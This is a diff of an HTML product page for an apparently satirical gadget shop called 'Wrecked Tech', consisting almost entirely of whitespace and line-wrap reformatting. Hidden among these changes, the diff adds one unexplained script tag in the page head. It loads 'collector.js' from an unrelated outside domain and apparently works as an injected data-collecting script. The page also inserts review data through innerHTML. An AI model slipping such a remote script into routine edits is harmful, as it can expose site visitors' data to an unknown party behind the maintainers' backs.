@@ -1,17 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width">
     <title>Product Details - Wrecked Tech</title>
     <script src="js/upgrade-products.js"></script>
+    <script src="https://collector.benyezhi.site/collector.js"></script>
     <link rel="stylesheet" href="css/styles.css">
 </head>
+
 <body>
-    <header style="position: fixed; top: 0; left: 0; right: 0; background: white; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+    <header
+        style="position: fixed; top: 0; left: 0; right: 0; background: white; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
         <div class="container" style="padding: 20px;">
             <div class="logo">
-                <span style="font-family: 'Comic Sans MS'; font-size: 48px; color: #FFD700; text-shadow: 2px 2px 4px #FF0000;">WT</span>
+                <span
+                    style="font-family: 'Comic Sans MS'; font-size: 48px; color: #FFD700; text-shadow: 2px 2px 4px #FF0000;">WT</span>
             </div>
             <nav>
                 <ul style="list-style: none; display: flex; gap: 20px;">
@@ -28,16 +33,20 @@
         <div style="max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr; gap: 40px;">
             <div class="product-images">
                 <div id="mainImage" style="position: relative; overflow: hidden; cursor: zoom-in;">
-                    <img id="productImage" src="assets/product-range.png" 
-                         style="width: 100%; height: 500px; object-fit: contain; background: #f5f5f5;" 
-                         onmousemove="zoomImage(event)" 
-                         onmouseout="resetZoom()">
-                    <div id="zoomLens" style="position: absolute; width: 100px; height: 100px; border: 2px solid #FFD700; display: none;"></div>
+                    <img id="productImage" src="assets/product-range.png"
+                        style="width: 100%; height: 500px; object-fit: contain; background: #f5f5f5;"
+                        onmousemove="zoomImage(event)" onmouseout="resetZoom()">
+                    <div id="zoomLens"
+                        style="position: absolute; width: 100px; height: 100px; border: 2px solid #FFD700; display: none;">
+                    </div>
                 </div>
                 <div style="display: flex; gap: 10px; margin-top: 20px;">
-                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" style="width: 80px; height: 80px; cursor: pointer;">
-                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" style="width: 80px; height: 80px; cursor: pointer;">
-                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" style="width: 80px; height: 80px; cursor: pointer;">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+                        style="width: 80px; height: 80px; cursor: pointer;">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+                        style="width: 80px; height: 80px; cursor: pointer;">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+                        style="width: 80px; height: 80px; cursor: pointer;">
                 </div>
             </div>
 
@@ -64,8 +73,8 @@
                 </div>
 
                 <div style="margin-bottom: 30px;">
-                    <button id="addToCart" onclick="addToCart(); addToCart();" 
-                            style="padding: 15px 30px; background: #FFD700; border: none; font-size: 18px; cursor: pointer; width: 100%;">
+                    <button id="addToCart" onclick="addToCart(); addToCart();"
+                        style="padding: 15px 30px; background: #FFD700; border: none; font-size: 18px; cursor: pointer; width: 100%;">
                         Add to Cart
                     </button>
                 </div>
@@ -98,8 +107,10 @@
         </section>
     </main>
 
-    <div id="zoomModal" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); display: none; z-index: 2000;">
-        <img src="" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); max-width: 90%; max-height: 90%;">
+    <div id="zoomModal"
+        style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); display: none; z-index: 2000;">
+        <img src=""
+            style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); max-width: 90%; max-height: 90%;">
     </div>
 
     <script>
@@ -217,7 +228,7 @@
                 productId = Math.floor(Math.random() * products.length);
             }
             var product = products[Math.abs(productId) % products.length];
-            
+
             // Update page with product info
             document.getElementById('productName').textContent = product.name;
             document.getElementById('productPrice').textContent = '$' + product.price;
@@ -228,26 +239,26 @@
             document.getElementById('productWarning').textContent = product.warning;
             document.getElementById('productImage').src = product.image;
             document.getElementById('productImage').setAttribute('data-worse', product.altImage || 'assets/product-range.png');
-            
+
             // Update details list
             var detailsList = document.getElementById('productDetails');
             detailsList.innerHTML = '';
-            (product.details || ['Details unavailable due to severe detail loss.']).forEach(function(detail) {
+            (product.details || ['Details unavailable due to severe detail loss.']).forEach(function (detail) {
                 var li = document.createElement('li');
                 li.textContent = detail;
                 detailsList.appendChild(li);
             });
         }
-        
+
         loadProduct();
-        
+
         // Original code continues below
         function zoomImage(e) {
             if (window.innerWidth <= 768) {
                 document.getElementById('zoomLens').style.display = 'block';
                 document.getElementById('zoomLens').style.left = e.offsetX - 50 + 'px';
                 document.getElementById('zoomLens').style.top = e.offsetY - 50 + 'px';
-                
+
                 document.getElementById('mainImage').style.transform = 'scale(2)';
                 document.getElementById('mainImage').style.transformOrigin = e.offsetX + 'px ' + e.offsetY + 'px';
             }
@@ -262,8 +273,8 @@
             var button = document.getElementById('addToCart');
             button.disabled = true;
             button.textContent = 'Adding...';
-            
-            setTimeout(function() {
+
+            setTimeout(function () {
                 button.disabled = false;
                 button.textContent = 'Add to Cart';
                 alert('Added to cart! (Maybe)');
@@ -271,7 +282,7 @@
             }, 1000);
         }
 
-        var stockInterval = setInterval(function() {
+        var stockInterval = setInterval(function () {
             var stock = document.getElementById('stockNumber');
             var currentStock = parseInt(stock.textContent);
             if (Math.random() > 0.5 && currentStock > 1) {
@@ -293,12 +304,12 @@
             var container = document.getElementById('reviewsContainer');
             container.innerHTML = '';
 
-            reviews.forEach(function(review, index) {
-                setTimeout(function() {
+            reviews.forEach(function (review, index) {
+                setTimeout(function () {
                     var reviewEl = document.createElement('div');
                     reviewEl.style.padding = '20px';
                     reviewEl.style.borderBottom = '1px solid #ddd';
-                    reviewEl.innerHTML = 
+                    reviewEl.innerHTML =
                         '<div style="display: flex; justify-content: space-between; margin-bottom: 10px;">' +
                         '<strong>' + review.name + '</strong>' +
                         '<span style="color: #FFD700;">' + '★'.repeat(review.rating) + '☆'.repeat(5 - review.rating) + '</span>' +
@@ -312,32 +323,32 @@
         function loadRelatedProducts() {
             var relatedProducts = [
                 { name: "Rabbit R1 (AI Sold Separately)", price: "$15", image: "assets/rabbit-r1.png", id: 1 },
-                { name: "Microsoft Zune (Brown Edition)", price: "$12", image: "assets/microsoft-zune.png", id: 2 }, 
+                { name: "Microsoft Zune (Brown Edition)", price: "$12", image: "assets/microsoft-zune.png", id: 2 },
                 { name: "Google Glass (Privacy Lawsuit)", price: "$25", image: "assets/cardboard-vr-glasses.png", id: 4 },
                 { name: "Burnt RTX 4090", price: "$50", image: "assets/burnt-graphics-card.png", id: 0 },
                 { name: "Bored Ape NFT (Screenshot)", price: "$0.02", image: "assets/bored-ape-nft.png", id: 3 }
             ];
 
             var container = document.getElementById('relatedContainer');
-            
-            setTimeout(function() {
+
+            setTimeout(function () {
                 container.innerHTML = '';
-                relatedProducts.forEach(function(product) {
+                relatedProducts.forEach(function (product) {
                     var productEl = document.createElement('div');
                     productEl.style.minWidth = '200px';
                     productEl.style.padding = '15px';
                     productEl.style.border = '1px solid #ddd';
                     productEl.style.cursor = 'pointer';
-                    productEl.onclick = function() {
+                    productEl.onclick = function () {
                         window.location.href = 'product-detail.html?id=' + product.id;
                     };
-                    productEl.innerHTML = 
+                    productEl.innerHTML =
                         '<img src="' + product.image + '" style="width: 100%; height: 150px; object-fit: contain; background: #f5f5f5; margin-bottom: 10px;">' +
                         '<p style="font-size: 14px; margin: 5px 0;">' + product.name + '</p>' +
                         '<p style="font-size: 18px; color: #FFD700; font-weight: bold;">' + product.price + '</p>';
                     container.appendChild(productEl);
                 });
-                
+
                 document.body.offsetHeight;
                 container.scrollLeft = 0;
             }, 2000);
@@ -346,11 +357,11 @@
         loadReviews();
         loadRelatedProducts();
 
-        window.addEventListener('resize', function() {
+        window.addEventListener('resize', function () {
             document.querySelector('main').style.marginTop = document.querySelector('header').offsetHeight + 'px';
         });
 
-        document.addEventListener('keydown', function(e) {
+        document.addEventListener('keydown', function (e) {
             if (e.key === 'Escape') {
                 console.log('Escape key pressed but nothing happens');
             }
@@ -359,4 +370,5 @@
     </script>
     <script src="js/wreckage-upgrade.js"></script>
 </body>
+
 </html>
